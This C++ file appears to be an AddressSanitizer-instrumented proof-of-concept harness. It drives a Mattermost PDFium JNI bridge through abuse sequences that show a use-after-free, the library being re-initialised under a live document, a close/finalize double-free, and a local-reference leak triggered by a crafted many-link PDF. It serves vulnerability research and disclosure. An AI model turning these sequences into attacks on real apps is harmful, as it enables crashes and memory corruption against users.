// Drives the UNMODIFIED native-lib.cpp JNI entry points through the abuse
// sequences. Built with -fsanitize=address: ASan is the oracle that proves
// the lifetime findings are real memory-corruption, not just static argument.
#include <jni.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>

extern "C" {
JNIEXPORT jlong        JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeOpenDocument(JNIEnv*, jobject, jstring, jstring);
JNIEXPORT void         JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeCloseDocument(JNIEnv*, jobject, jlong);
JNIEXPORT jboolean     JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeIsDocumentValid(JNIEnv*, jobject, jlong);
JNIEXPORT jint         JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeGetPageCount(JNIEnv*, jobject, jlong);
JNIEXPORT jboolean     JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeRenderPageToBitmap(JNIEnv*, jobject, jlong, jint, jobject, jfloat);
JNIEXPORT jobjectArray JNICALL Java_com_mattermost_pdfium_PdfBridge_nativeGetLinksForPage(JNIEnv*, jobject, jlong, jint);
}

JNIEnv* make_mock_env();
extern int g_initCalls, g_destroyCalls;
long jnimock_live_refs(); long jnimock_total_refs(); long jnimock_peak_refs(); void jnimock_reset();

static JNIEnv* E;
static jstring S(std::string* s) { return reinterpret_cast<jstring>(s); }

static jlong openDoc(const char* name) {
    std::string p(name);
    jlong h = Java_com_mattermost_pdfium_PdfBridge_nativeOpenDocument(E, nullptr, S(&p), nullptr);
    fprintf(stderr, ">> open(%s) -> handle=0x%llx\n", name, (unsigned long long)h);
    return h;
}
static void closeDoc(jlong h) {
    fprintf(stderr, ">> nativeCloseDocument(0x%llx)\n", (unsigned long long)h);
    Java_com_mattermost_pdfium_PdfBridge_nativeCloseDocument(E, nullptr, h);
}

int main(int argc, char** argv) {
    setbuf(stdout, nullptr);   // unbuffered so the narrative survives ASan abort
    E = make_mock_env();
    const char* sc = argc > 1 ? argv[1] : "f1";

    if (!strcmp(sc, "f1")) {
        puts("=== F1: deterministic, single-threaded, no race, benign PDFs ===");
        puts("    Idiomatic consumer code (preload two attachments, free the first):");
        puts("      val a = PdfBridge.open(\"A.pdf\")");
        puts("      val b = PdfBridge.open(\"B.pdf\")");
        puts("      a.close()");
        puts("      if (b.isValid()) b.getPageCount()   // <-- UAF here\n");
        jlong a = openDoc("A.pdf");
        jlong b = openDoc("B.pdf");
        closeDoc(a);                 // wrapper A cleanup() => FPDF_DestroyLibrary()
        // The natural defensive guard a careful consumer would use:
        jboolean ok = Java_com_mattermost_pdfium_PdfBridge_nativeIsDocumentValid(E, nullptr, b);
        printf(">> b.isValid() == %s  (the guard is UNSOUND -- B's library was destroyed)\n",
               ok ? "true" : "false");
        puts(">> guard says valid, so consumer calls b.getPageCount() ...");
        int n = Java_com_mattermost_pdfium_PdfBridge_nativeGetPageCount(E, nullptr, b);
        printf("getPageCount(B) returned %d (NO ASan abort => bug NOT reproduced)\n", n);
        return 0;
    }

    if (!strcmp(sc, "f1render")) {
        puts("=== F1 escalation: re-InitLibrary under live doc B, then RENDER B ===");
        jlong a = openDoc("A.pdf");
        jlong b = openDoc("B.pdf");
        closeDoc(a);                 // FPDF_DestroyLibrary()  (destroyCalls=1)
        jlong c = openDoc("C.pdf");  // FPDF_InitLibrary() again, B still live
        puts(">> consumer renders the still-open B (attacker-influenced content) ...");
        jboolean r = Java_com_mattermost_pdfium_PdfBridge_nativeRenderPageToBitmap(
            E, nullptr, b, 0, (jobject)0x1, 1.0f);
        printf("render(B) returned %d (NO ASan abort => not reproduced)\n", (int)r);
        (void)c;
        return 0;
    }

    if (!strcmp(sc, "f1b")) {
        puts("=== F1b: re-FPDF_InitLibrary() while a document is still live ===");
        jlong a = openDoc("A.pdf");
        jlong b = openDoc("B.pdf");
        closeDoc(a);                 // destroys library (initCalls=1, destroyCalls=1)
        jlong c = openDoc("C.pdf");  // re-inits library while B (and now C) alive
        printf("initCalls=%d destroyCalls=%d  (B opened under lib gen1, C forced gen2 while B live)\n",
               g_initCalls, g_destroyCalls);
        bool bug = (g_initCalls == 2 && g_destroyCalls == 1);
        printf("%s: FPDF_InitLibrary re-entered with a live FPDF_DOCUMENT outstanding\n",
               bug ? "CONFIRMED" : "not reproduced");
        (void)b; (void)c;
        return bug ? 0 : 1;
    }

    if (!strcmp(sc, "df")) {
        puts("=== Double-free: Kotlin close()/finalize() race => 2x nativeCloseDocument(same handle) ===");
        jlong a = openDoc("A.pdf");
        closeDoc(a);                 // app thread close()
        puts(">> GC FinalizerDaemon also runs finalize()->close() with same non-volatile handle ...");
        closeDoc(a);                 // double entry: UAF/double-free of DocumentWrapper
        puts("second close returned (NO ASan abort => bug NOT reproduced)");
        return 0;
    }

    if (!strcmp(sc, "f4")) {
        const char* env = getenv("POC_NLINKS");
        long N = env ? atol(env) : 250;
        printf("=== F4: JNI local-ref leak in nativeGetLinksForPage (N=%ld link annots) ===\n", N);
        jlong a = openDoc("linkbomb.pdf");
        jnimock_reset();
        Java_com_mattermost_pdfium_PdfBridge_nativeGetLinksForPage(E, nullptr, a, 0);
        long live = jnimock_live_refs(), total = jnimock_total_refs(), peak = jnimock_peak_refs();
        printf("after getLinksForPage: total local refs created=%ld, peak alive=%ld, STILL LEAKED=%ld\n",
               total, peak, live);
        if (N > 0) printf("=> ~%.2f leaked local refs PER link annotation\n", (double)live / (double)N);
        const long ART_CAP = 512;
        if (live > 0)
            printf("=> ART local-ref table cap ~%ld entries; overflow/abort at N >= ~%ld link annotations\n",
                   ART_CAP, (long)(ART_CAP / ((double)peak / (double)N)) + 1);
        return 0;
    }

    fprintf(stderr, "unknown scenario '%s' (use: f1 | f1b | df | f4)\n", sc);
    return 2;
}
